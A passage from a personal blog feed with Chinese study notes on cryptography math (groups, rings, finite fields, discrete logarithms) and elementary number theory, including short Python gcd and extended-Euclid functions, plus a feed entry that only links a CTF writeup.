      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础散记</title>
      <link href="/2024/03/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/"/>
      <url>/2024/03/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些遇到的密码学相关知识<del>（当裁缝）</del></p></blockquote><h2 id="威尔逊定理"><a href="#威尔逊定理" class="headerlink" title="威尔逊定理"></a>威尔逊定理</h2><p>任一素数减去1的阶乘与-1模该素数同余。即对于任何素数p，都有<br>$$<br>(p-1)!+1\equiv 0(mod\ p)<br>$$</p><h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>设p是素数，f(x)是整系数多项式，再设a1,a2,…,an两两对模不同余，满足<br>$$<br>f(a_j)\equiv 0(mod\ p),1\leq j\leq n<br>$$<br>则存在整系数多项式q(x)，使得<br>$$<br>f(x)\equiv q(x)(x-a_1)(x-a_2)…(x-a_n)(mod\ p)<br>$$<br>由此可进一步推知，<br>$$<br>x^{p-1}-1\equiv (x-1)…(x-p+1)(mod\ p)<br>$$</p><h2 id="群论"><a href="#群论" class="headerlink" title="群论"></a>群论</h2><p>参考了百度百科和<a href="https://blog.csdn.net/chenxy_bwave/article/details/122702319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170972835316800226592151%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170972835316800226592151&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122702319-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%BE%A4%E8%AE%BA&spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="二元运算"><a href="#二元运算" class="headerlink" title="二元运算"></a>二元运算</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306205145595.png" alt="image-20240306205145595"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306205505241.png" alt="image-20240306205505241"></p><h3 id="循环群"><a href="#循环群" class="headerlink" title="循环群"></a>循环群</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306210708812.png" alt="image-20240306210708812"></p><h3 id="阿贝尔群"><a href="#阿贝尔群" class="headerlink" title="阿贝尔群"></a>阿贝尔群</h3><p>若一个群满足交换律，则称其为阿贝尔群，也称为交换群。</p><h3 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h3><p>设(M,<em>)和(S,·)是两个群，σ:M→S，∀a,b∈M，有σ(a</em>b)&#x3D;σ(a)·σ(b)，则称σ为M到S的同态或群映射。</p><p>也就是说，先运算再映射和先映射再运算得到的结果相等。</p><p>如果为单射，则称为单同态。</p><h3 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h3><p>如果一个同态映射可逆（双射），则称这两个群同构。</p><h3 id="半群"><a href="#半群" class="headerlink" title="半群"></a>半群</h3><p>只满足定义中的1、2两条</p><h2 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h2><p>当模m有原根时，设l为模m的一个原根，则当x&#x3D;l^k mod m时，<br>$$<br>Ind_lx\equiv k(mod\ \phi(m))<br>$$<br>离散对数和一般的对数有着相类似的性质：<br>$$<br>Ind_lxy\equiv Ind_lx+Ind_ly(mod\ \phi(m))<br>$$</p><p>$$<br>Ind_lx^y\equiv yInd_lx(mod\ \phi(m))<br>$$</p><p>在程序中，我们可以用sympy库中的discrete_log函数来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">x=</span><br><span class="line">y=</span><br><span class="line">z=</span><br><span class="line">e=sympy.discrete_log(x,y,z)  <span class="comment">##求e，discrete_log(x,y,z)，x为模，y为余数，z为底数 </span></span><br></pre></td></tr></table></figure><h2 id="环和域"><a href="#环和域" class="headerlink" title="环和域"></a>环和域</h2><p>需要结合上面说到的群论来看，参考了这篇文章](<a href="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170980296016800184186780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%8E%AF&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142^v99^pc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187</a>)</p><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307204549987.png" alt="image-20240307204549987"></p><h3 id="交换环-含幺环-交换含幺环"><a href="#交换环-含幺环-交换含幺环" class="headerlink" title="交换环 含幺环 交换含幺环"></a>交换环 含幺环 交换含幺环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307204829672.png" alt="image-20240307204829672"></p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205000778.png" alt="image-20240307205000778"></p><h3 id="无零因子环和含零因子环"><a href="#无零因子环和含零因子环" class="headerlink" title="无零因子环和含零因子环"></a>无零因子环和含零因子环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205056700.png" alt="image-20240307205056700"></p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205356769.png" alt="image-20240307205356769"></p><p>在有限含幺环中，无零因子等同于(非零元)有逆元。</p><h3 id="整环（整区）"><a href="#整环（整区）" class="headerlink" title="整环（整区）"></a>整环（整区）</h3><p>交换含幺的无零因子环称为整环。</p><h3 id="除环"><a href="#除环" class="headerlink" title="除环"></a>除环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205340140.png" alt="image-20240307205340140"></p><p>除环是含幺的无零因子环。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>接上面的环，参考了百度百科和<a href="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170980296016800184186780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%8E%AF&spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205839086.png" alt="image-20240307205839086"></p><p>可以说，可交换的除环是域，或有限整环是域</p><p>百度百科上的描述也不错</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307211359034.png" alt="image-20240307211359034"></p><h3 id="有限域（伽罗瓦域）"><a href="#有限域（伽罗瓦域）" class="headerlink" title="有限域（伽罗瓦域）"></a>有限域（伽罗瓦域）</h3><p>如果域F只包含有限个元素，则称其为有限域。有限域中元素的个数称为有限域的阶。有限域的特征数必为某一素数p，因此它含的素域同构于Zp。若F是特征为p的有限域，则F中元素的个数为pⁿ,n为某一正整数。元素个数相同的有限域是同构的。因此，通常用GF(pⁿ)表示pⁿ元的有限域。GF(pⁿ)的乘法群是(pⁿ-1)阶的循环群。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qsnCTF2024 Round1 Writeup</title>
      <link href="/2024/03/01/qsnCTF2024%20Round1-Writeup/"/>
      <url>/2024/03/01/qsnCTF2024%20Round1-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/qsnCTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“小光的答案之书” in “Misc” was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> qsnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《初等数论》学习笔记</title>
      <link href="/2024/02/24/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/24/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从今天开始，不间断地更新一些《初等数论》学习笔记，简单打一下密码学的基础<del>（为了密码学不爆零T0T）</del></p></blockquote><h2 id="第一章-整数的整除性"><a href="#第一章-整数的整除性" class="headerlink" title="第一章 整数的整除性"></a>第一章 整数的整除性</h2><h3 id="gcd-a-b-gcd-b-r"><a href="#gcd-a-b-gcd-b-r" class="headerlink" title="gcd(a,b)&#x3D;gcd(b,r)"></a>gcd(a,b)&#x3D;gcd(b,r)</h3><p>假设a和b都是整数，且a&gt;b</p><p><strong>a&#x3D;bq+r</strong>, 0&lt;r&lt;b</p><p>其中q和r都是正整数，则a和b的最大公因数等于b和r的最大公因数，即</p><p><strong>gcd(a,b) &#x3D; gcd(b,r)</strong></p><h3 id="欧几里得算法（辗转相除法）"><a href="#欧几里得算法（辗转相除法）" class="headerlink" title="欧几里得算法（辗转相除法）"></a>欧几里得算法（辗转相除法）</h3><p>利用上述性质，我们可以用欧几里得算法来求两个较大数的最大公因数。用语言通俗地表达，就是先用较大数除以较小数，然后用上一个式子的除数除以上一个式子的余数，如此反复至余数为0，最后一个式子的除数即为最大公因数。</p><p>百度百科中的这张图较好地解释了其中原理：</p><img src="/images/《初等数论》学习笔记/辗转相除.webp" alt="辗转相除" style="zoom:50%;" /><p>下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><p>看书上都没有讲，但是也很重要，这里补充一下。</p><p>这个算法在用辗转相除法找到gcd(a,b)的前提下，还能找到x,y，使得ax+by&#x3D;gcd(a,b)。（根据贝祖&#x2F;裴蜀定理，x和y总是存在）</p><p>具体原理引用这篇文章来讲<a href="https://blog.csdn.net/qq_37701948/article/details/132716594">https://blog.csdn.net/qq_37701948/article/details/132716594</a></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240224212552584.png" alt="image-20240224212552584"></p><p>如此可以得到欧几里得算法中前后两步之间x和y的关系，已知最后一步时b&#x3D;0，于是可以以此倒推出原来的x和y，下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):     </span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a     </span><br><span class="line">    <span class="keyword">else</span>:         </span><br><span class="line">        x, y, q = ext_euclid(b, a % b) </span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)         </span></span><br><span class="line">        x, y = y, (x - (a // b) * y)         </span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure><p>特别地，当a和b互素的时候，gcd(a,b)&#x3D;1，因此要求的就是能使ax+by&#x3D;1成立的x和y。这里的x其实就是a的模反元素（模逆元），在RSA解密中有着重要作用，以后的文章中再做详细的描述。</p><h3 id="ab-dm"><a href="#ab-dm" class="headerlink" title="ab&#x3D;dm"></a>ab&#x3D;dm</h3><p>假设a和b都是正整数，a和b的最大公因数是d而a和b的最小公倍数是m，即(a,b)&#x3D;d而{a,b}&#x3D;m，则我们有</p><p>ab&#x3D;dm</p><p>这可以用来更快捷地求出大数的最小公倍数：我们可以先试用欧几里得算法求出最大公因数，所以m&#x3D;ab&#x2F;d</p><h2 id="第二章-数的进位法"><a href="#第二章-数的进位法" class="headerlink" title="第二章 数的进位法"></a>第二章 数的进位法</h2><h3 id="求补码"><a href="#求补码" class="headerlink" title="求补码"></a>求补码</h3><p>对于二进制数(a1a2…an)2，当n≥3时，可用如下方法快速求补码</p><h4 id="当an-1时"><a href="#当an-1时" class="headerlink" title="当an&#x3D;1时"></a>当an&#x3D;1时</h4><p>除an不变，在a1,a2,…an-1中所有ai是0的都变成1，而所有ai是1的都变成0。由这种方法所得到的二进制数就是(a1a2…an)2的补码</p><h4 id="当an-0时"><a href="#当an-0时" class="headerlink" title="当an&#x3D;0时"></a>当an&#x3D;0时</h4><p>在(a1a2…an)2中从右往左看，则在出现1以前所有的0及其第一次出现的1都不变，而后各数遇0变成1，遇1则变成0.用这种方法所得到的二进制数就是(a1a2…an)2的补码。</p><h3 id="利用补码来进行二进制数减法运算"><a href="#利用补码来进行二进制数减法运算" class="headerlink" title="利用补码来进行二进制数减法运算"></a>利用补码来进行二进制数减法运算</h3><p>先求减数的补码，用被减数加上补码再减去减数</p><h2 id="第三章-一部分不定方程"><a href="#第三章-一部分不定方程" class="headerlink" title="第三章 一部分不定方程"></a>第三章 一部分不定方程</h2><h3 id="一元不定方程"><a href="#一元不定方程" class="headerlink" title="一元不定方程"></a>一元不定方程</h3><p>设n≥2，而n,a0,a1,…,an都是整数，求出关于整数系数的n次方程<br>$$<br>a_nx^n+a_{n-1}x^{n-1}+…+a_1x+a_0&#x3D;0<br>$$<br>设x&#x3D;α是其整数解，那么<br>$$<br>a_n\alpha^n+a_{n-1}\alpha^{n-1}+…+a_1\alpha+a_0&#x3D;0<br>$$</p><p>$$<br>a_0&#x3D;-\alpha(a_n\alpha^{n-1}+a_{n-1}\alpha^{n-2}+…+a_1)<br>$$</p><p>所以只要能从a0中挑选出能使原式成立的因数，即为原式的整数解，否则无整数解</p><h3 id="二元一次不定方程"><a href="#二元一次不定方程" class="headerlink" title="二元一次不定方程"></a>二元一次不定方程</h3><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>设二元一次不定方程ax+by&#x3D;c（其中a,b,c都是正整数而gcd(a,b)&#x3D;1，有一组整数解x&#x3D;x0,y&#x3D;y0，则其一切整数解可以表示成<br>$$<br>\begin{cases} x&#x3D;x_0-bt \ y&#x3D;y_0+at \end{cases}<br>$$<br>其中t&#x3D;0,±1,±2,±3,…</p><h4 id="求ax-by-c的一切整数解"><a href="#求ax-by-c的一切整数解" class="headerlink" title="求ax+by&#x3D;c的一切整数解"></a>求ax+by&#x3D;c的一切整数解</h4><p>假设gcd(a,b)&#x3D;1，</p><p>先求ax+by&#x3D;1的解，可利用第一章中所述之扩展欧几里得算法，得到解x&#x3D;x0,y&#x3D;y0.</p><p>所以ax+by&#x3D;c(ax0+by0)，</p><p>所以x&#x3D;cx0,y&#x3D;cy0.</p><p>由上述定理得，x&#x3D;cx0-bt，y&#x3D;cy0+at，其中t&#x3D;0,±1,±2,±3,…</p><p>如果放在实际应用问题中，要记得注意定义域。</p><h3 id="费马大定理"><a href="#费马大定理" class="headerlink" title="费马大定理"></a>费马大定理</h3><p>当n是一个大于2的正整数时，则<br>$$<br>x^n+y^n&#x3D;z^n<br>$$<br>这个不定方程没有正整数解。</p><h2 id="第四章-一次同余式及解法"><a href="#第四章-一次同余式及解法" class="headerlink" title="第四章 一次同余式及解法"></a>第四章 一次同余式及解法</h2><h3 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h3><p>如果a和b都是整数而m是一个固定的正整数，则当m|(a-b)（即m能够整除a-b）时，我们就说a,b对模m同余，记作<br>$$<br>a\equiv b(mod\ m)<br>$$</p><h3 id="一些结论"><a href="#一些结论" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>当a是整数而m是一个正整数时，则有<br>$$<br>a\equiv a(mod\ m)<br>$$</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>如果a,b都是整数而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立时，我们有<br>$$<br>b\equiv a(mod\ m)<br>$$</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>如果a,b,c都是整数而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>b\equiv c(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a\equiv c(mod\ m)<br>$$</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>c\equiv d(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a+c\equiv b+d(mod\ m)<br>$$</p><p>$$<br>a-c\equiv b-d(mod\ m)<br>$$</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>如果a,b,c都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立，我们有<br>$$<br>ac\equiv bc(mod\ m)<br>$$</p><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>c\equiv d(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>ac\equiv bd(mod\ m)<br>$$</p><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>如果a,b都是整数，而m和n都是正整数，则当<br>$$<br>a\equiv b(mod m)<br>$$<br>成立时，我们有<br>$$<br>a^n\equiv b^n(mod\ m)<br>$$</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>如果a1,a2,…an,b1,b2,…bn都是整数，而m和n都是正整数，则当<br>$$<br>a_1\equiv b_1(mod\ m)<br>$$</p><p>$$<br>a_2\equiv b_2(mod\ m)<br>$$</p><p>​……<br>$$<br>a_n\equiv b_n(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a_1+a_2+…+a_n\equiv b_1+b_2+…+b_n(mod\ m)<br>$$</p><h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>按照通常方法，把一个正整数a写成十进位数的形式，即<br>$$<br>a&#x3D;a_n10^n+a_{n-1}10^{n-1}+…+a_0,0\leq a_i&lt;10<br>$$<br>当9能够整除an+an-1+…+a0时，则我们有9能够整除a</p><h3 id="弃九法"><a href="#弃九法" class="headerlink" title="弃九法"></a>弃九法</h3><p>$$<br>a&#x3D;a_n10^n+a_{n-1}10^{n-1}+…+a_0<br>$$</p><p>$$<br>b&#x3D;b_m10^m+b_{m-1}10^{m-1}+…+b_0<br>$$</p><p>$$<br>ab&#x3D;P<br>$$</p><p>$$<br>P&#x3D;c_l10^l+c_{l-1}10^{l-1}+…c_0<br>$$</p><p>由上面的结论，我们可以得到<br>$$<br>a\equiv a_n+a_{n-1}+…+a_0(mod\ 9)<br>$$</p><p>$$<br>b\equiv b_n+b_{n-1}+…+b_0(mod\ 9)<br>$$</p><p>$$<br>P\equiv c_n+c_{n-1}+…+c_0(mod\ 9)<br>$$</p><p>进而得到<br>$$<br>(a_n+a_{n-1}+…+a_0)(b_m+b_{m-1}+…+b_0)\equiv c_l+c_{l-1}+…+c_0(mod\ 9)<br>$$<br>如果an,an-1,…a0,bm,bm-1,…b0,cl,cl-1,…c0中有9出现，可以把9去掉</p><h3 id="一次同余式"><a href="#一次同余式" class="headerlink" title="一次同余式"></a>一次同余式</h3><p>如果a,b都是整数，而m是一个正整数，当a mod m ≠0时，我们把<br>$$<br>ax+b\equiv 0(mod\ m)<br>$$<br>叫做模m的一次同余式</p><h3 id="一些结论-1"><a href="#一些结论-1" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>如果c能使ac+b mod m&#x3D;0成立，则x mod m &#x3D;c的一切整数x都能使其成立，也就是上式的一个解</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>当gcd(a.m)不能够整除b时，则一次同余式<br>$$<br>ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0<br>$$<br>没有整数解</p><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>当gcd(a,m)&#x3D;1时，则一次同余式<br>$$<br>ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0<br>$$<br>有整数解</p><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><p>如果ad mod md &#x3D;bd，则有a mod m&#x3D;b</p><img src="/images/《初等数论》学习笔记/image-20240229000118869.png" alt="image-20240229000118869"  /><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240229000135048.png" alt="image-20240229000135048"></p><h3 id="孙子定理（中国剩余定理）"><a href="#孙子定理（中国剩余定理）" class="headerlink" title="孙子定理（中国剩余定理）"></a>孙子定理（中国剩余定理）</h3><p>如果k≥2，而m1,m2,…mk是两个两两互素的k个正整数，也就是说，在这k个正整数中任意取出两个正整数来，则这两个正整数是互素的，令<br>$$<br>M&#x3D;m_1m_2…m_k&#x3D;m_1M_1&#x3D;m_2M_2&#x3D;…&#x3D;m_kM_k<br>$$<br>则同时满足同余式组<br>$$<br>x\equiv b_1(mod\ m_1),x\equiv b_2(mod\ m_2),…,x\equiv b_k(mod\ m_k)<br>$$<br>的正整数解是<br>$$<br>x\equiv b_1M’_1M_1+b_2M’_2M_2+…+b_kM’_kM_k(mod\ M)<br>$$<br>这里M’i是满足同余式<br>$$<br>M’_iM_i\equiv 1(mod\ m_i)<br>$$<br>的正整数解，i&#x3D;1,2,…,k</p><p>其实百度百科上说的也不错：</p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240229002625329.png" alt="image-20240229002625329"></p><p>根据不同的情况，中国剩余定理可以有不同的使用，但基本情况就是如上，对照着搓一下代码应该不难。</p><h2 id="第五章-剩余系，欧拉定理，费马定理及其应用"><a href="#第五章-剩余系，欧拉定理，费马定理及其应用" class="headerlink" title="第五章 剩余系，欧拉定理，费马定理及其应用"></a>第五章 剩余系，欧拉定理，费马定理及其应用</h2><h3 id="完全剩余系"><a href="#完全剩余系" class="headerlink" title="完全剩余系"></a>完全剩余系</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302002055889.png" alt="image-20240302002055889"></p><h3 id="一些结论-2"><a href="#一些结论-2" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h4><p>设m是一个大于1的整数，b是一个整数且满足条件(b,m)&#x3D;1.如果a1,a2,…am是模m的一个完全剩余系，则ba1,ba2,…,bam也是模m的一个完全剩余系</p><h4 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h4><p>设m是一个大于1的整数，而b,c是两个任意的整数但满足条件(b,m)&#x3D;1，如果a1,a2,…,am是模m的一个完全剩余系，则ba1+c,ba2+c,…,bam+c也是模m的一个完全剩余系</p><h4 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h4><p>如果m是一个大于1的整数而a,b是任意的两个整数，使得<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立，则有gcd(a,m)&#x3D;gcd(b,m)</p><h3 id="欧拉函数φ-m"><a href="#欧拉函数φ-m" class="headerlink" title="欧拉函数φ(m)"></a>欧拉函数φ(m)</h3><p>我们用φ(m)来表示不大于m而和m互素的正整数的个数。我们把φ(m)叫做欧拉函数。其中φ(1)&#x3D;1</p><h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>设l是一个正整数，p是一个素数，则我们有<br>$$<br>\varphi(p^l)&#x3D;p^{l-1}(p-1)<br>$$</p><h3 id="简化剩余系"><a href="#简化剩余系" class="headerlink" title="简化剩余系"></a>简化剩余系</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302145523366.png" alt="image-20240302145523366"></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302145531674.png" alt="image-20240302145531674"></p><h3 id="一个结论"><a href="#一个结论" class="headerlink" title="一个结论"></a>一个结论</h3><p>设m是一个大于1的整数，a是一个整数且满足条件gcd(a,m)&#x3D;1.如果b1,b2,…bφ(m)是模m的一个简化剩余系，则<br>$$<br>ab_1,ab_2,…,ab_{\varphi (m)}<br>$$<br>也是模m的一个简化剩余系</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>设m是一个大于1的整数，a是一个素数且满足条件gcd(a,m)&#x3D;1，则我们有<br>$$<br>a^{\varphi(m)}\equiv 1(mod\ m)<br>$$<br>上式在RSA算法中有重要作用</p><h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>对于欧拉定理有一种特殊情况，那就是当模m为素数是时，此时就可以得到费马小定理<br>$$<br>a^{p-1}\equiv 1(mod\ p)<br>$$</p><h2 id="第六章-小数、分数和实数"><a href="#第六章-小数、分数和实数" class="headerlink" title="第六章 小数、分数和实数"></a>第六章 小数、分数和实数</h2><h3 id="一些结论-3"><a href="#一些结论-3" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h4><p>设0&lt;a&lt;b，且gcd(a,b)&#x3D;1.如果a&#x2F;b能表示成纯循环小数，则我们有gcd(b,10)&#x3D;1</p><h4 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h4><p>设0&lt;a&lt;b，且gcd(a,b)&#x3D;1.令h是一个最小的正整数，能使<br>$$<br>10^h\equiv 1(mod\ b)<br>$$<br>成立，则a&#x2F;b能表示成纯循环小数0.a1…ah</p><h4 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h4><p>设b是一个正整数且gcd(10,b)&#x3D;1，令h是一个最小的正整数，能使<br>$$<br>10^h\equiv 1(mod\ b)<br>$$<br>成立，则有h|φ(b)</p><h4 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h4><p>设a,b,b1都是正整数，a&lt;b，gcd(a,b)&#x3D;1，b1&gt;1，gcd(b1,10)&#x3D;1.b&#x3D;2^α5^βb1，其中α,β都是非负整数但不同时为0.令h是一个最小的正整数且能使<br>$$<br>10^h\equiv 1(mod\ b_1)<br>$$<br>则当α≥β时我们有<br>$$<br>\frac{a}{b}&#x3D;0.a_t…a_a\dot a_\alpha…\dot 